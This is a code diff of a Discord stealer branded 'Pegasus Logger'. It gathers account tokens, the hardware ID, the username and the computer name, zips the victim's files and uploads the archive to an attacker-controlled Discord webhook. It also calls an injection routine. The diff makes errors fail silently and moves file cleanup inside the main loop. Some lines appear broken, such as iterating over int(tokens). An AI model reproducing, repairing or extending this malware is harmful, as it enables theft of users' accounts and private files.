@@ -27,7 +27,7 @@ WEBHOOK_URL = "&WEBHOOK_URL&"
 
 def main(webhook_url):
     global webhook, embed
-    
+
     webhook = Webhook.from_url(webhook_url, adapter=RequestsWebhookAdapter())
     embed = Embed(title="Pegasus Logger", color=15535980)
     
@@ -50,30 +50,27 @@ def main(webhook_url):
         
     embed.set_author(name=f"@ {strftime('%D | %H:%M:%S', localtime())}")
     embed.set_footer(text="Pegasus Logger | Made by www.addidix.xyz")
-    embed.set_thumbnail(url="https://i.imgur.com/q1NJvOx.png")
-    
+    embed.set_thumbnail(url="https://images-ext-2.discordapp.net/external/8_XRBxiJdDcKXyUMqNwDiAtIb8lt70DaUHRiUd_bsf4/https/i.imgur.com/q1NJvOx.png")
+
     zipup()
         
     file = None
     file = File(f'files-{os.getenv("UserName")}.zip')
     
     webhook.send(content="||@here|| <http://www.addidix.xyz>", embed=embed, file=file, avatar_url="https://media.discordapp.net/attachments/798245111070851105/930314565454004244/IMG_2575.jpg", username="Pegasus")
-
-    cleanup()
-
+    
 def pegasus():
-    for func in [
-        main(WEBHOOK_URL),
-        inject(WEBHOOK_URL),
-        ]:
+    global errors
+    
+    errors = []
+
+    for func in {main(WEBHOOK_URL), 
+    cleanup(),
+    inject(WEBHOOK_URL),}:
         try:
             func()
-        except Exception as e:
-            try:
-                webhook = Webhook.from_url(WEBHOOK_URL, adapter=RequestsWebhookAdapter())
-                webhook.send(content=f"error log: {e}", avatar_url="https://media.discordapp.net/attachments/798245111070851105/930314565454004244/IMG_2575.jpg", username="Pegasus")
-            except:
-                pass
+        except:
+            pass
 
 def accinfo():
     for t in int(tokens):
@@ -109,8 +106,7 @@ def get_more():
     def gethwid():
         p = Popen("wmic csproduct get uuid", shell=True, stdin=PIPE, stdout=PIPE, stderr=PIPE)
         return (p.stdout.read() + p.stderr.read()).decode().split("\n")[1]
-    
-    login = os.getlogin()
+
     cwd = os.getcwd()
     pc_username = os.getenv("UserName")
     pc_name = os.getenv("COMPUTERNAME")
